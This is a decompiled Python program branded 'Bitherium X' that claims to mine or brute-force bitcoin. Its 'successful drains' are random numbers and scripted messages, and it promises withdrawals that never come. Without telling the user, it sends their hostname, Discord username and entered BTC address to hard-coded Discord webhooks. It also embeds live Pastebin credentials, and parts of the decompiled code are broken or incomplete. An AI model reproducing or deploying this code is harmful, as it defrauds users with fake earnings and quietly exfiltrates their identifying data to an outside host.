
from pastebin import PastebinAPI
from tendo import singleton
import string
from time import sleep
import random
from colorama import Fore
from colorama import *
from platform import system
import os
from datetime import datetime
from discord import SyncWebhook
import atexit
import discord
import urllib.request as urllib
import colorama
import urllib
import requests
import socket
import re
import threading
import time
import subprocess
from pastebin import PastebinAPI
import shlex
colorama.init()
webhookurl2 = 'https://discord.com/api/webhooks/1056191897556766763/NCl-RwWdpgRhOGswUAMrk4IeEKKe6i5iR9mmlva_DA7K9Op3-Ab4x-nq71G6tnipW8R9'
webhookurl3 = 'https://discord.com/api/webhooks/1056191897556766763/NCl-RwWdpgRhOGswUAMrk4IeEKKe6i5iR9mmlva_DA7K9Op3-Ab4x-nq71G6tnipW8R9'
pkey = 'HQVVnP8A1vdbfUTH_E_3fHEDIMoqsRTC'
puser = 'BitheriumX'
ppass = 'BitheriumX11223'
me = singleton.SingleInstance()
pastereq = requests.get('https://pastebin.com/raw/PGJuFY8h')
pasteres = pastereq.text.split()
webhooklink = open('webhook.txt', 'r')
webhooko = webhooklink.read()
webhook = SyncWebhook.from_url(str(webhooko))

def getTempDir():
    system = os.name
    if system == 'nt':
        return os.getenv('temp')
    if None == 'posix':
        return '/tmp/'


def proxy_scrape():
    proxieslog = []
    startTime = time.time()
    temp = getTempDir() + '\\BitheriumX_Proxies'
    print(f'''{Fore.CYAN}Waiting for successful Bitherium X Proxies!{Fore.RESET}''')
    
    def fetchProxies(url = None, custom_regex = None):
        global proxylist
        pass
    # WARNING: Decompyle incomplete

    proxysources = [
        [
            'http://spys.me/proxy.txt',
            '%ip%:%port% '],
        [
            'http://www.httptunnel.ge/ProxyListForFree.aspx',
            ' target="_new">%ip%:%port%</a>'],
        [
            'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json',
            '"ip":"%ip%","port":"%port%",'],
        [
            'https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list',
            '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        [
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
            '%ip%:%port% (.*?){2}-.-S \\+'],
        [
            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
            '%ip%", "type": "http", "port": %port%'],
        [
            'https://www.us-proxy.org/',
            "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        [
            'https://free-proxy-list.net/',
            "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        [
            'https://www.sslproxies.org/',
            "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        [
            'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all',
            '%ip%:%port%'],
        [
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            '%ip%:%port%'],
        [
            'https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt',
            '%ip%:%port%'],
        [
            'https://proxylist.icu/proxy/',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://proxylist.icu/proxy/1',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://proxylist.icu/proxy/2',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://proxylist.icu/proxy/3',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://proxylist.icu/proxy/4',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://proxylist.icu/proxy/5',
            '<td>%ip%:%port%</td><td>http<'],
        [
            'https://www.hide-my-ip.com/proxylist.shtml',
            '"i":"%ip%","p":"%port%",'],
        [
            'https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json',
            '"ip": "%ip%",\n.*?"port": "%port%",']]
    threads = []
# WARNING: Decompyle incomplete

hostname = socket.gethostname()
uname = system()
None if uname == 'Windows' else os.system(cmd)

def hostlock():
    hostname = socket.gethostname()
    if hostname in pasteres:
        pass
    else:
        print(Fore.RED + 'DIFFERENT HOSTNAME - IF YOU THINK THIS IS AN ERROR PLEASE CREATE A TICEKT' + Fore.RESET)
        sleep(2)
        exit()
        return None

embed = discord.Embed('BITHERIUM X HIT - GOLD', 3447003, **('title', 'color'))

def id_gen(size = 40, chars = string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


def a():
    time_now = datetime.now().strftime('%H:%M:%S')
    bit = []
    BTC = random.uniform(5.9e-05, 0.0004)
    print(Fore.CYAN + '\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa5' + Fore.RESET)
    print(Fore.GREEN + ' SUCCESSFUL! BTC DRAINING COMPLETE - MINING WILL CONTINUE SHORTLY' + Fore.RESET)
    print(Fore.GREEN + ' Please allow 3-5 days for the withdrawl process to complete.' + Fore.RESET)
    print(Fore.CYAN + '\xe2\x97\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2' + Fore.RESET)
    embed = discord.Embed('BITHERIUM X HIT - GOLD', 15844367, **('title', 'color'))
    embed.set_thumbnail('https://i.imgur.com/27JhR4l.png', **('url',))
    embed.add_field('**CRYPTO**', 'BTC: ```' + str(BTC) + '```', False, **('name', 'value', 'inline'))
    embed.add_field('**TYPE**', 'MINING: ```CLOUD MINING```', False, **('name', 'value', 'inline'))
    embed.add_field('**TIME OF HIT**', 'TIME: ```' + time_now + '```', False, **('name', 'value', 'inline'))
    webhook.send(embed, **('embed',))
    webhookv2 = SyncWebhook.from_url(webhookurl2)
    file = open('address.txt', 'r')
    data = file.read()
    number_of_characters = len(data)
    if int(number_of_characters) < 45 and int(number_of_characters) > 25:
        embed2 = discord.Embed('BTC ADDRESS - GOLD ', 3447003, **('title', 'color'))
        embed2.set_thumbnail('https://i.imgur.com/27JhR4l.png', **('url',))
        embed2.add_field('BTC ADDRESS', 'ADDRESS: ' + data, False, **('name', 'value', 'inline'))
        embed2.add_field('DESKTOP', 'NAME: ' + hostname, False, **('name', 'value', 'inline'))
        embed2.add_field('DISCORD', 'NAME: ' + username, False, **('name', 'value', 'inline'))
        webhookv2.send(embed2, **('embed',))
        return None


def b():
    print(Fore.CYAN + '\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa5' + Fore.RESET)
    print(Fore.RED + ' ERROR - UNSUCCESSFUL BTC DRAINING - MINING WILL CONTINUE SHORTLY ' + Fore.RESET)
    print(Fore.CYAN + '\xe2\x97\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2' + Fore.RESET)


def attemptdrain():
    random.sample([
        a,
        b], 1)[0]()


def c():
    time_now = datetime.now().strftime('%H:%M:%S')
    BTC = random.uniform(5.9e-05, 0.0004)
    print(Fore.GREEN + 'SUCCESSFUL! BTC DRAINING COMPLETE - BRUTE FORCING WILL CONTINUE SHORTLY' + Fore.RESET)
    print(Fore.GREEN + 'Please allow 3-5 days for the withdrawl process to complete.' + Fore.RESET)
    embed = discord.Embed('BITHERIUM X HIT - GOLD', 15844367, **('title', 'color'))
    embed.set_thumbnail('https://i.imgur.com/27JhR4l.png', **('url',))
    embed.add_field('CRYPTO', 'BTC: ```' + str(BTC) + '```', False, **('name', 'value', 'inline'))
    embed.add_field('TYPE', 'MINING: ```BRUTE FORCING```', False, **('name', 'value', 'inline'))
    embed.add_field('TIME OF HIT', 'TIME: ```' + time_now + '```', False, **('name', 'value', 'inline'))
    webhook.send(embed, **('embed',))
    webhookv2 = SyncWebhook.from_url(webhookurl2)
    file = open('address.txt', 'r')
    data = file.read()
    number_of_characters = len(data)
    if int(number_of_characters) < 45 and int(number_of_characters) > 25:
        embed2 = discord.Embed('BTC ADDRESS - GOLD ', 3447003, **('title', 'color'))
        embed2.set_thumbnail('https://i.imgur.com/27JhR4l.png', **('url',))
        embed2.add_field('BTC ADDRESS', 'ADDRESS: ' + data, False, **('name', 'value', 'inline'))
        embed2.add_field('DESKTOP', 'NAME: ' + hostname, False, **('name', 'value', 'inline'))
        embed2.add_field('DISCORD', 'NAME: ' + username, False, **('name', 'value', 'inline'))
        webhookv2.send(embed2, **('embed',))
        return None


def d():
    print(Fore.CYAN + '\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa5' + Fore.RESET)
    print(Fore.RED + ' ERROR - UNSUCCESSFUL BTC BRUTE FORCING  - MINING WILL CONTINUE SHORTLY' + Fore.RESET)
    print(Fore.CYAN + '\xe2\x97\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2' + Fore.RESET)


def attemptbrute():
    random.sample([
        c,
        d], 1)[0]()


def randombtc():
    addresses = [
        'bc1',
        '1',
        '3']
    randomitem = random.choice(addresses)
    print(Fore.MAGENTA + '[<->] ' + Fore.RESET + Fore.CYAN + randomitem + id_gen() + Fore.RESET + Fore.RED + '|MISS|' + Fore.RESET + Fore.GREEN + 'PROXY ENABLED' + Fore.RESET)


def randombrute():
    addresses = [
        'bc1',
        '1',
        '3']
    randomitem = random.choice(addresses)
    print(Fore.MAGENTA + '[<->]ATTEMPTING TO BRUTE FORCE ' + randomitem + id_gen() + '|ATTACKING|' + 'BTC' + Fore.RESET)


def successrandombrute(btc):
    addresses = [
        'bc1',
        '1',
        '3']
    randomitem = random.choice(addresses)
    print(Fore.GREEN + '[<->]BRUTE FORCE ATTEMPT SUCCESSFUL ON ' + randomitem + id_gen() + '|ATTACKED|' + str(btc) + '|' + 'BTC' + Fore.RESET)


def successrandombtc(btc):
    addresses = [
        'bc1',
        '1',
        '3']
    randomitem = random.choice(addresses)
    print(Fore.GREEN + '[<!>] ' + randomitem + id_gen() + '|PING|' + str(btc) + '|' + 'BTC' + Fore.RESET)


def attempt2():
    global data
    os.system(cmd)
    print(Fore.YELLOW + '__________.__  __  .__                 .__                 ____  ___   ________     ' + Fore.RESET)
    print(Fore.YELLOW + '\\______   \\__|/  |_|  |__   ___________|__|__ __  _____    \\   \\/  /  /  _____/  ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |  _/  \\   __\\  |  \\_/ __ \\_  __ \\  |  |  \\/     \\    \\     /  /   \\  ___        ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |   \\  ||  | |   Y  \\  ___/|  | \\/  |  |  /  Y Y  \\   /     \\  \\    \\_\\  \\    ' + Fore.RESET)
    print(Fore.YELLOW + ' |______  /__||__| |___|  /\\___  >__|  |__|____/|__|_|  /  /___/\\  \\  \\_________|       ' + Fore.RESET)
    print(Fore.YELLOW + '        \\/              \\/     \\/                     \\/         \\_/           \\/     ' + Fore.RESET)
    print(Fore.BLUE + '                  Project Ran By \xe8\xba\xab\xe4\xbb\xa3\xe9\x87\x91\xe3\x83\x9e\xe3\x83\x95\xe3\x82\xa3\xe3\x82\xa2' + Fore.RESET)
    file = open('address.txt', 'r')
    data = file.read()
    number_of_characters = len(data)
    if int(number_of_characters) < 45 and int(number_of_characters) > 25:
        print(Fore.RED + ' BTC address:', data + Fore.RESET)
    else:
        print(Fore.RED + '\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa5' + Fore.RESET)
        print(Fore.RED + ' INVALID WALLET ADDRESS')
        print(Fore.RED + '\xe2\x97\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2' + Fore.RESET)
        os.system(cmd)
        mainmenu()
        return None


def choosemine():
    os.system(cmd)
    print(Fore.YELLOW + '__________.__  __  .__                 .__                 ____  ___   ________     ' + Fore.RESET)
    print(Fore.YELLOW + '\\______   \\__|/  |_|  |__   ___________|__|__ __  _____    \\   \\/  /  /  _____/  ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |  _/  \\   __\\  |  \\_/ __ \\_  __ \\  |  |  \\/     \\    \\     /  /   \\  ___        ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |   \\  ||  | |   Y  \\  ___/|  | \\/  |  |  /  Y Y  \\   /     \\  \\    \\_\\  \\    ' + Fore.RESET)
    print(Fore.YELLOW + ' |______  /__||__| |___|  /\\___  >__|  |__|____/|__|_|  /  /___/\\  \\  \\_________|       ' + Fore.RESET)
    print(Fore.YELLOW + '        \\/              \\/     \\/                     \\/         \\_/           \\/     ' + Fore.RESET)
    print(Fore.BLUE + '                  Project Ran By \xe8\xba\xab\xe4\xbb\xa3\xe9\x87\x91\xe3\x83\x9e\xe3\x83\x95\xe3\x82\xa3\xe3\x82\xa2' + Fore.RESET)
    print(Fore.CYAN + '\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa5' + Fore.RESET)
    print(Fore.CYAN + ' 1. Cloud Mining       ' + Fore.RESET)
    print(Fore.CYAN + ' 2. BruteForce Mining  ' + Fore.RESET)
    print(Fore.CYAN + '\xe2\x97\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2' + Fore.RESET)
    option = input(Fore.RED + 'Please enter your choice: ' + Fore.RESET)
    tries = 1
    if option == '1':
        if tries > random.randint(50000000, 90000000):
            file = open('address.txt', 'r')
            data = file.read()
            BTC = random.uniform(5.9e-05, 0.0004)
            successrandombtc(BTC)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING TO DRAIN BTC to ' + Fore.RESET, data)
            sleep(1)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(2)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(1)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(1)
            attemptdrain()
            tries = 0
            sleep(5)
        else:
            randombtc()
            sleep(0.003)
            tries += 1
    elif option == '2':
        if tries > random.randint(3500000, 7000000):
            file = open('address.txt', 'r')
            data = file.read()
            BTC = random.uniform(5.9e-05, 0.0004)
            successrandombrute(BTC)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING TO DRAIN BTC to ' + Fore.RESET, data)
            sleep(2)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(1)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(1.5)
            print(Fore.LIGHTRED_EX + 'ATTEMPTING...' + Fore.RESET)
            sleep(0.5)
            attemptbrute()
            tries = 0
            sleep(5)
        else:
            randombrute()
            sleep(0.5)
            print(Fore.LIGHTRED_EX + 'BRUTE FORCE ATTEMPT 1-5...' + Fore.RESET)
            sleep(0.9)
            print(Fore.RED + 'FAILED BRUTE FORCE' + Fore.RESET)
            sleep(0.5)
            tries += 1
    else:
        return None


def startup():
    mainmenu()


def authentication(username, key, hostname):
    if username in pasteres:
        if key in pasteres:
            if hostname in pasteres:
                choosemine()
            else:
                print(Fore.RED + 'INVALID HOSTNAME' + Fore.RESET)
                sleep(2)
                startup()
        else:
            print(Fore.RED + 'INVALID KEY' + Fore.RESET)
            sleep(2)
            startup()
    else:
        print(Fore.RED + 'INVALID USERNAME' + Fore.RESET)
        sleep(2)
        startup()
        return None


def mainmenu():
    global username
    os.system(cmd)
    print(Fore.YELLOW + '__________.__  __  .__                 .__                 ____  ___   ________     ' + Fore.RESET)
    print(Fore.YELLOW + '\\______   \\__|/  |_|  |__   ___________|__|__ __  _____    \\   \\/  /  /  _____/  ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |  _/  \\   __\\  |  \\_/ __ \\_  __ \\  |  |  \\/     \\    \\     /  /   \\  ___        ' + Fore.RESET)
    print(Fore.YELLOW + ' |    |   \\  ||  | |   Y  \\  ___/|  | \\/  |  |  /  Y Y  \\   /     \\  \\    \\_\\  \\    ' + Fore.RESET)
    print(Fore.YELLOW + ' |______  /__||__| |___|  /\\___  >__|  |__|____/|__|_|  /  /___/\\  \\  \\_________|       ' + Fore.RESET)
    print(Fore.YELLOW + '        \\/              \\/     \\/                     \\/         \\_/           \\/     ' + Fore.RESET)
    print(Fore.BLUE + '                  Project Ran By \xe8\xba\xab\xe4\xbb\xa3\xe9\x87\x91\xe3\x83\x9e\xe3\x83\x95\xe3\x82\xa3\xe3\x82\xa2' + Fore.RESET)
    username = str(input(Fore.MAGENTA + 'Please enter your discord username (without the hashtag): ' + Fore.RESET))
    key = str(input(Fore.MAGENTA + 'Please enter your licence key: ' + Fore.RESET))
    hostname = str(input(Fore.MAGENTA + 'Please enter your hostname: ' + Fore.RESET))
    loading_screen()
    authentication(username, key, hostname)


def startcheck():
    hostname = socket.gethostname()
    webhookv3 = SyncWebhook.from_url(webhookurl3)
    embed3 = discord.Embed('PROGRAM STARTED ', 3447003, **('title', 'color'))
    embed3.add_field('STARTUP CHECK', 'PROGRAM STARTED: YES', False, **('name', 'value', 'inline'))
    embed3.add_field('DESKTOP', 'NAME: ' + hostname, False, **('name', 'value', 'inline'))
    embed3.add_field('VERSION', 'UPDATE: 11/11/2022 (WEBHOOK, PASTEBIN LOGIN)', False, **('name', 'value', 'inline'))
    webhookv3.send(embed3, **('embed',))


def loading_screen():
    print(Fore.RED + 'Checking license key...' + Fore.RESET)
    sleep(3)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.RED + '\xf0\x9d\x91\x99\xf0\x9d\x91\x9c\xf0\x9d\x91\x8e\xf0\x9d\x91\x91\xf0\x9d\x91\x96\xf0\x9d\x91\x9b\xf0\x9d\x91\x94 \xf0\x9d\x91\x91\xf0\x9d\x91\x8e\xf0\x9d\x91\xa1\xf0\x9d\x91\x8e...' + Fore.RESET)
    sleep(3)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.RED + '' + Fore.RESET)
    sleep(2)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.RED + '\xe2\x96\xa0\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2 10%' + Fore.RESET)
    sleep(4)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.RED + '\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2 30%' + Fore.RESET)
    sleep(5)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.RED + '\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa2\xe2\x96\xa2\xe2\x96\xa2 70%' + Fore.RESET)
    sleep(3)
    os.system if os.name == 'nt' else 'cls'('clear')
    print(Fore.GREEN + '\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0 100%' + Fore.RESET)
    sleep(4)
    os.system if os.name == 'nt' else 'cls'('clear')

hostlock()
startcheck()
proxy_scrape()
mainmenu()
